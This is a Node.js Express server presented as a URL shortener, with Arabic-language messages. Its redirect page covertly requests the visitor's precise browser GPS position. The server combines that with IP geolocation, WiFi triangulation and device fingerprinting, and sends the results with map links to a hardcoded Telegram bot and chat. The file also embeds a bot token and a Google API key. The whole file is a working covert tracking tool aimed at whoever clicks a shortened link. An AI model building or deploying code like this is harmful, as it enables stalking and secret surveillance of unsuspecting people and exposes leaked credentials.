const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

// ===== TELEGRAM =====
async function sendToTelegram(msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const response = await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        },
        { timeout: 10000 }
      );
      console.log('✅ [TG] Sent:', response.data.result.message_id);
      return true;
    } catch (err) {
      console.error(`❌ [TG] Attempt ${i + 1} failed:`, err.response?.data?.description || err.message);
      if (i < retries - 1) await new Promise(r => setTimeout(r, 1000));
    }
  }
  return false;
}

// ===== GEOLOCATION METHODS =====
async function getIPLocation(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 });
    if (res.data && res.data.status === 'success') {
      return {
        method: '🌐 IP Geolocation',
        country: res.data.country,
        city: res.data.city,
        latitude: parseFloat(res.data.lat).toFixed(6),
        longitude: parseFloat(res.data.lon).toFixed(6),
        accuracy: '±50-100km',
        isp: res.data.isp
      };
    }
  } catch (e) {
    console.log('[IP] Error:', e.message);
  }
  return null;
}

async function reverseGeocode(lat, lng) {
  try {
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { timeout: 3000, headers: { 'User-Agent': 'LinkShortener/1.0' } }
    );
    if (res.data && res.data.address) {
      const addr = res.data.address;
      return {
        method: '🗺️ Reverse Geocoding',
        country: addr.country || 'Unknown',
        city: addr.city || addr.town || addr.village || 'Unknown',
        address: res.data.display_name || 'N/A'
      };
    }
  } catch (e) {
    console.log('[Reverse] Error:', e.message);
  }
  return null;
}

async function getWiFiLocation(wifiData) {
  if (!wifiData || !Array.isArray(wifiData) || wifiData.length === 0) return null;
  try {
    const payload = {
      wifiAccessPoints: wifiData.slice(0, 10).map(w => ({
        macAddress: w.bssid || w.ssid || '00:00:00:00:00:00',
        signalStrength: w.level || -50
      }))
    };
    const res = await axios.post(
      `https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyAJT6OiVBLUw-bPv6yqzHKjVx9dPy_pVIM`,
      payload,
      { timeout: 3000 }
    );
    if (res.data && res.data.location) {
      return {
        method: '📶 WiFi Triangulation',
        latitude: parseFloat(res.data.location.lat).toFixed(6),
        longitude: parseFloat(res.data.location.lng).toFixed(6),
        accuracy: `±${res.data.accuracy.toFixed(0)}m`,
        networks: wifiData.length
      };
    }
  } catch (e) {
    console.log('[WiFi] Error:', e.message);
  }
  return null;
}

function parseUserAgent(ua) {
  let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
  if (/android/i.test(ua)) device = 'Android';
  else if (/iphone|ipad/i.test(ua)) device = 'iOS';
  if (/windows/i.test(ua)) os = 'Windows';
  else if (/mac os/i.test(ua)) os = 'macOS';
  else if (/linux/i.test(ua)) os = 'Linux';
  else if (/android/i.test(ua)) os = 'Android';
  if (/chrome/i.test(ua)) browser = 'Chrome';
  else if (/firefox/i.test(ua)) browser = 'Firefox';
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
  return { device, os, browser };
}

// ===== API ROUTES (قبل route الـ :code) =====

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  let normalizedUrl = url.trim();
  if (!/^https?:\/\//i.test(normalizedUrl)) {
    normalizedUrl = 'https://' + normalizedUrl;
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: normalizedUrl, created: new Date(), clicks: 0 };

  console.log(`[SHORT] Created: ${shortCode} -> ${normalizedUrl}`);

  res.json({
    shortened: `${BASE_URL}/${shortCode}`,
    code: shortCode
  });
});

app.post('/api/log-all', async (req, res) => {
  console.log('[API] /api/log-all called, body:', JSON.stringify(req.body).substring(0, 300));

  const { code, gps, wifi } = req.body;

  if (!code || !linkStorage[code]) {
    console.log('[API] Code not found:', code);
    return res.status(404).json({ error: 'Not found' });
  }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
  const userAgent = req.get('user-agent') || 'Unknown';
  const originalUrl = linkStorage[code].original;
  linkStorage[code].clicks++;

  console.log(`[LOG] Processing ${code} | IP: ${ip}`);

  let gpsInfo = null;
  if (gps && gps.latitude && gps.longitude) {
    gpsInfo = {
      latitude: parseFloat(gps.latitude).toFixed(6),
      longitude: parseFloat(gps.longitude).toFixed(6),
      accuracy: `±${(gps.accuracy || 20).toFixed(0)}m`,
      altitude: gps.altitude ? `${gps.altitude.toFixed(0)}m` : 'N/A',
      heading: gps.heading !== null && gps.heading !== undefined ? `${gps.heading.toFixed(0)}°` : 'N/A'
    };
  }

  const [ipInfo, wifiInfo] = await Promise.all([
    getIPLocation(ip),
    getWiFiLocation(wifi)
  ]);

  let reverseInfo = null;
  if (gpsInfo) {
    reverseInfo = await reverseGeocode(gpsInfo.latitude, gpsInfo.longitude);
  } else if (ipInfo) {
    reverseInfo = await reverseGeocode(ipInfo.latitude, ipInfo.longitude);
  }

  const device = parseUserAgent(userAgent);

  let msg = `🔗 <b>رابط فُتح!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
  msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
  msg += `<b>🌐 الرابط:</b> ${originalUrl}\n`;
  msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
  msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n━━━━━━━━━━━━━━━━━━━\n\n`;

  if (gpsInfo) {
    msg += `<b>✅ [1] 📍 Browser GPS</b>\n📍 <code>${gpsInfo.latitude}, ${gpsInfo.longitude}</code>\n📏 ${gpsInfo.accuracy}\n⛰️ ${gpsInfo.altitude}\n🧭 ${gpsInfo.heading}\n🗺️ <a href="https://maps.google.com/?q=${gpsInfo.latitude},${gpsInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>❌ [1] Browser GPS</b> - غير متاح\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  if (ipInfo) {
    msg += `<b>✅ [2] 🌐 IP Geolocation</b>\n🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city}\n📍 <code>${ipInfo.latitude}, ${ipInfo.longitude}</code>\n📏 ${ipInfo.accuracy}\n🏢 ${ipInfo.isp}\n🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>❌ [2] IP Geolocation</b> - فشل\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  if (wifiInfo) {
    msg += `<b>✅ [3] 📶 WiFi Triangulation</b>\n📍 <code>${wifiInfo.latitude}, ${wifiInfo.longitude}</code>\n📏 ${wifiInfo.accuracy}\n🗺️ <a href="https://maps.google.com/?q=${wifiInfo.latitude},${wifiInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>❌ [3] WiFi Triangulation</b> - غير متاح\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  if (reverseInfo) {
    msg += `<b>✅ [4] 🗺️ Reverse Geocoding</b>\n🏳️ ${reverseInfo.country}\n🏙️ ${reverseInfo.city}\n━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>❌ [4] Reverse Geocoding</b> - فشل\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  msg += `<b>✅ [5] 🖥️ Device Detection</b>\n📱 ${device.device} | ${device.os} | ${device.browser}\n━━━━━━━━━━━━━━━━━━━\n\n`;

  const bestMethod = gpsInfo ? '📍 GPS' : (wifiInfo ? '📶 WiFi' : (ipInfo ? '🌐 IP' : 'None'));
  msg += `<b>✅ [6] 🎯 Best Available</b>\n${bestMethod}`;

  const sent = await sendToTelegram(msg);
  res.json({ success: sent });
});

app.get('/api/test', async (req, res) => {
  const ok = await sendToTelegram('🔗 رسالة اختبار من السيرفر ✅');
  res.json({ telegram: ok ? 'sent' : 'failed' });
});

app.get('/api/stats/:code', (req, res) => {
  const link = linkStorage[req.params.code];
  if (!link) return res.status(404).json({ error: 'Not found' });
  res.json(link);
});

// ===== الصفحة الرئيسية (index.html) =====
app.use(express.static('.'));

// ===== REDIRECT (لازم آخر route) =====
app.get('/:code', (req, res) => {
  const { code } = req.params;

  if (!linkStorage[code]) {
    return res.status(404).send('<h1>الرابط غير موجود</h1>');
  }

  const originalUrl = linkStorage[code].original;
  console.log(`[REDIRECT] ${code} -> ${originalUrl}`);

  res.send(`<!DOCTYPE html>
<html dir="rtl">
<head><meta charset="UTF-8"></head>
<body>
<script>
(function() {
  var code = ${JSON.stringify(code)};
  var apiUrl = ${JSON.stringify(BASE_URL + '/api/log-all')};
  var originalUrl = ${JSON.stringify(originalUrl)};

  window.location.href = originalUrl;

  function sendData(data) {
    fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
      keepalive: true
    }).catch(function() {
      navigator.sendBeacon(apiUrl, JSON.stringify(data));
    });
  }

  var payload = { code: code };

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        payload.gps = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          heading: pos.coords.heading
        };
        sendData(payload);
      },
      function() { sendData(payload); },
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
  } else {
    sendData(payload);
  }
})();
</script>
</body>
</html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});